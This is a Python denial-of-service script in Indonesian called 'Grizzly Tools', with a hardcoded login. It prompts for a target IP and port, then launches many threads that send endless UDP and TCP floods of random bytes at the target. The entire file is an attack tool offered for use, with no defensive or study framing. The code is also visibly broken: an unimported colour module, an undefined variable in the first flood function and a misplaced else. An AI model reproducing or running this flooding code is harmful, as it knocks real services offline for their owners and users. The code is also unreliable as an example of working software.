import random
import socket
import time
import os,sys
import threading

print("\u001b[35m Selamat Datang di Grizzly Tools")
time.sleep(2)
print("Loading.......")
os.system("clear")

attemps = 0

while attemps < 150:
    username = input('Masukkan username: ')
    password = input('Masukkan kata sandi: ')

    if username == 'Grizzly' and password == 'Grizzly':
        print('Anda telah berhasil masuk.')
        break
    else:
        print('Kredensial salah. Periksa apakah Anda mengaktifkan Caps lock dan coba lagi.')
        attemps += 1
        continue

print("")
print("")
print(Fore.GREEN +"                       [-] START [-]\n")
print(Fore.YELLOW +"                       Ddos by Grizzly\n")
print(Fore.BLUE +"                        Code By Grizzly")

ip = str(input(Fore.GREEN +"TARGET IP:"))
port = int(input("TARGET PORT:"))
choice = str(input("GASS?(y/n):"))
times = int(input("PACKET:"))
threads = int(input("ONGKIR:"))
def run():
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +"*****Grizzly-On-Top***** Ip %s Dan Port : %s"%(ip, port))
        except:
            print("======>FUCK THE SYSTEM<======")
            
def run2():
    data = random._urandom(1024)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"*****Grizzly-On-Top***** Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("======>FUCK THE SYSTEM<======")
            
def run3():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"*****Grizzly-On-Top***** Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("======>FUCK THE SYSTEM<======")

def run4():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"*****Grizzly-On-Top***** Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("======>FUCK THE SYSTEM<======")
            
def run5():
    data = random._urandom(1800)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +"*****Grizzly-On-Top***** Ip %s Dan Port : %s"%(ip, port))
        except:
            print("======>FUCK THE SYSTEM<======")
            
def run6():
    data = random._urandom(1024)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"*****Grizzly-On-Top***** Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("======>FUCK THE SYSTEM<======")
            
def run7():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"*****Grizzly-On-Top***** Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("======>FUCK THE SYSTEM<======")

def run8():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"*****Grizzly-On-Top***** Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("======>FUCK THE SYSTEM<======")
            
def run9():
    data = random._urandom(1800)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +"*****Grizzly-On-Top***** Ip %s Dan Port : %s"%(ip, port))
        except:
            print("======>FUCK THE SYSTEM<======")
            
def run10():
    data = random._urandom(1024)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"*****Grizzly-On-Top***** Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("======>FUCK THE SYSTEM<======")
            
def run11():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"*****Grizzly-On-Top***** Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("======>FUCK THE SYSTEM<======")

def run12():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"*****Grizzly-On-Top***** Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("======>FUCK THE SYSTEM<======")
            
def run13():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"*****Grizzly-On-Top***** Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("======>FUCK THE SYSTEM<======")

def run14():
    data = random._urandom(16)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"*****Grizzly-On-Top***** Ip %s Dan Port : %s"%(ip, port))
        except:
            s.close()
            print("======>FUCK THE SYSTEM<======")
for y in range(threads):
    if choice == 'y':
        th = threading.Thread(target = run)
        th.start()
        th = threading.Thread(target = run2)
        th.start()
        th = threading.Thread(target = run3)
        th.start()
        th = threading.Thread(target = run4)
        th.start()
        th = threading.Thread(target = run5)
        th.start()
        th = threading.Thread(target = run6)
        th.start()
        th = threading.Thread(target = run7)
        th.start()
        th = threading.Thread(target = run8)
        th.start()
        th = threading.Thread(target = run9)
        th.start()
        th = threading.Thread(target = run10)
        th.start()
        th = threading.Thread(target = run11)
        th.start()
        th = threading.Thread(target = run12)
        th.start()
        th = threading.Thread(target = run13)
        th.start()
else:
        th = threading.Thread(target = run14)
        th.start()
